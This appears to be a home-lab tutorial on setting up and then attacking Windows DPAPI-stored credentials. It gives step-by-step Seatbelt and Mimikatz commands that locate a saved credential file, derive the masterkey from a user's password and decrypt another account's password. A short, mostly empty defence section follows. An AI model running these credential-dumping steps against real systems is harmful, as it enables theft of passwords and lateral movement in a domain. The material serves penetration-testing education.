---
description: >-
  DPAPI stands for Data Protection API. Which is used by windows to securely
  save credentials.
---

# Dumping DPAPI

## Configuring

1. Login to `DC03` as the `Administrator` user with the password `Welcome01!`.
2. Open the "Active Directory Users and Computers" management tool and open the "Users" directory. Right click the "Users" directory and click "New User"
3. Create a user with the name `sa_backup` and the password `LS6RV5o8T9`. Make sure you deselect "User must change password at next logon" and select "Password never expires".

![](<../../.gitbook/assets/image (67).png>)

![](<../../.gitbook/assets/image (62).png>)

4\. Add the user to the "Account operator" and "Backup Operator" groups via the interface, memberof section or run the following command:

```
Add-ADGroupMember "Account Operators" -Members sa_backup
Add-ADGroupMember "Backup Operators" -Members sa_backup
```

5\. Login with the `sa_sql` user and the password `Iloveyou2` on `DATA01`.

6\. Click start and open the "Credential Manager".

![](<../../.gitbook/assets/image (64).png>)

7\. Click on the "Windows Credentials" tab and select "Add a Windows credential".

![](<../../.gitbook/assets/image (12) (1).png>)

8\. Fill in the following information:

* Internet or network address: `secure.local`
* User Name: `sa_backup`
* Password: `LS6RV5o8T9`

![](<../../.gitbook/assets/image (21).png>)

## Attacking

### How it works

If a user is logged in or if you have the password of a user you can retrieve its DPAPI masterkey and decrypt the saved credentials. These saved credentials might give you access to other systems or higher privileges within the domain and can be used for lateral movement.

### Tools

* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)

### Executing the attack

1. One of the things I like to do when gaining access to a system is running seatbelt. This program will check many things like permissions, groups and for stored credentials. The tool describes itself as:

> Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives.

2\. To run seatbelt and do some of it checks we can run the following command:

```
.\Seatbelt.exe -group=user
```

3\. In the output of the seciont WindowsCredentialFiles we can see that the user sa\_sql has some credentials saved:

![](<../../.gitbook/assets/image (18).png>)

4\. We can find the master encryption key id and some information with the following Mimikatz command using this path:

```
./mimikatz.exe
dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD
```

![](<../../.gitbook/assets/image (12).png>)

The `pbData` field contains the encrypted data and the `guidMasterKey` contains the GUID of the key needed to decrypt it.

{% hint style="info" %}
The latest compiled version of Mimikatz doesn't work on server 2022. Compiling the latest commit with Visual Studio 2019 gave me some errors, but this [https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64](https://github.com/matrix/mimikatz/tree/type\_cast-pointer\_truncation\_x64) repostory/pull request worked for me without errors! I really hate compiling tools like this, always errors :cry:
{% endhint %}

5\. The next step is to retrieve the masterkey with the password of the user. Luckily we had its password from the time we captured it after doing a UNC path injection through the SQL Service. The password of the `sa_sql` user was `Iloveyou2`.

```
dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected
```

![](<../../.gitbook/assets/image (11).png>)

6\. We were able to retrieve the Masterkey, it it shown at almost the end of the output. Now we can read the saved credentials with the masterkey using the following Mimikatz command:

```
dpapi::cred /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Credentials\02BF8752741C7A447536E822E53153CD /masterkey:b3e8630e96acba990f836b4462a9285a4c987776f17f11b2559d9fdf67d03cf6b99dd89445d5641aef6f4477f7354eb6f19e3053e1d56712f45bc227249cdea2
```

![](<../../.gitbook/assets/image (2).png>)

First we get the output of the first mimikatz command we ran, some information about the credentials. The output shows is the saved credential for the `sa_backup` user with the password `LS6RV5o8T9`.

7\. With the help of PowerView we can quickly check if this user has any value:

![](<../../.gitbook/assets/image (4).png>)

In PowerView we can see that `sa_backup` is member of the `Account Operators` en `Backup Operators` groups. These groups are interesting!

## Defending

### Recommendations

* Don't save RDP credentials in Windows.

### Detection



## References

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++" %}

{% embed url="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords" %}
